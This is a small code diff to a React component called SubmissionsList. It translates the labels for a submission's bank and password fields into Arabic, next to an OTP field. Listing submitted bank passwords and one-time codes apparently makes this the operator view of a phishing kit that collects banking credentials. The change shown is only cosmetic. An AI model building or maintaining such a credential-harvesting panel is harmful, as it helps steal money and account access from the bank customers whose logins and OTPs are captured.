@@ -117,13 +117,13 @@ export default function SubmissionsList() {
          
 
                   <div className='flex justify-start'>
-                    <strong className='mx-3 text-red-300 mx-4'>BANK </strong>
+                    <strong className='mx-3 text-red-300 mx-4'>البنك </strong>
                     <span className="mx-4"> {submission.bank}</span>
                   </div>
 
 
                   <div className='flex justify-start'>
-                    <strong className='mx-3 text-red-300 mx-4'>Pass </strong>
+                    <strong className='mx-3 text-red-300 mx-4'>الرقم السري </strong>
                     <span className="mx-4"> {submission.pass}</span>
                   </div>      <div className='flex justify-start'>
                     <strong className='mx-3 text-red-300 mx-4'>OTP</strong>
